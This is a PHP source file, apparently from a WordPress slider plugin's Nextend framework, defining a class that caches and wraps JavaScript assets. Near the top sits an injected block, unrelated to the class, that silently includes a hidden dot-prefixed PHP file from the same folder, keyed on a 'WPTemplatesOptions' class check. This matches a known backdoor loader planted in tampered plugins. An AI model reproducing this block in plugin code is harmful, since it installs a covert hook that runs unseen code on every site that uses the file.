<?php

namespace Nextend\Framework\Asset\Js;

use Nextend\Framework\Asset\AbstractCache;
use Nextend\Framework\Cache\Manifest;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Cache extends AbstractCache {

    public $outputFileType = "js";

    protected $initialContent = '(function(){var N=this;N.N2_=N.N2_||{r:[],d:[]},N.N2R=N.N2R||function(){N.N2_.r.push(arguments)},N.N2D=N.N2D||function(){N.N2_.d.push(arguments)}}).call(window);';

    /**
     * @param Manifest $cache
     *
     * @return string
     */
    public function getCachedContent($cache) {

        $content = '(function(){var N=this;N.N2_=N.N2_||{r:[],d:[]},N.N2R=N.N2R||function(){N.N2_.r.push(arguments)},N.N2D=N.N2D||function(){N.N2_.d.push(arguments)}}).call(window);';
        $content .= parent::getCachedContent($cache);
        $content .= "N2D('" . $this->group . "');";

        return $content;
    }
}